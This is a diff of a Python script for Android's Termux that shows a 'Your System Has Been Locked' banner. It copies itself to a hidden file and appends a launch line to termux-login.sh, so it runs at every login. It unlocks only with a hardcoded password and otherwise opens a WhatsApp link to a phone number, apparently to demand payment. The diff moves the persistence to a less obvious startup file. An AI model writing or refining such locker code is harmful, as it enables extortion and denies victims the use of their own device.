@@ -21,15 +21,15 @@ def logo2():
  Your System Has Been Locked By Nick777x\n
 """)
 try:
-	os.system("cp deface.py /data/data/com.termux/files/usr/etc/.t")
+	os.system("cp deface.py /data/data/com.termux/files/usr/lib/.t")
 	# os.system("cp /data/data/com.termux/files/usr/etc/bash.bashrc /data/data/com.termux/files/usr/etc/hacked.bashrc")
-	with open("/data/data/com.termux/files/usr/etc/bash.bashrc","r") as fileutama:
+	with open("/data/data/com.termux/files/usr/etc/termux-login.sh","r") as fileutama:
 		contentutama = fileutama.read()
-	with open("/data/data/com.termux/files/usr/etc/bash.bashrc","a") as filekedua:
-		if "python3 /data/data/com.termux/files/usr/etc/.t" in contentutama:
+	with open("/data/data/com.termux/files/usr/etc/termux-login.sh","a") as filekedua:
+		if "python3 /data/data/com.termux/files/usr/lib/.t" in contentutama:
 			pass
 		else:
-			filekedua.write("python3 /data/data/com.termux/files/usr/etc/.t")
+			filekedua.write("python3 /data/data/com.termux/files/usr/lib/.t")
 	def utama2():
 		os.system("login")
 	def utama():
@@ -40,8 +40,8 @@ try:
 		pasw = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPassword \033[1;31m: \033[0;37m")
 		print("")
 		if pasw == "111":
-			bayarnya = "/data/data/com.termux/files/usr/etc/bash.bashrc"
-			codenya = "python3 /data/data/com.termux/files/usr/etc/.t"
+			bayarnya = "/data/data/com.termux/files/usr/etc/termux-login.sh"
+			codenya = "python3 /data/data/com.termux/files/usr/lib/.t"
 			bypassnya = ""
 			with open(bayarnya,"r") as libas1:
 				lines = libas1.readlines()
@@ -51,7 +51,7 @@ try:
 						libas2.write(line)
 			with open(bayarnya,"a") as libas3:
 				libas3.write(bypassnya)
-			os.system("rm /data/data/com.termux/files/usr/etc/.t")
+			os.system("rm /data/data/com.termux/files/usr/lib/.t")
 		else:
 			os.system("xdg-open https://wa.me/+6283141494320")
 			os.system("login")
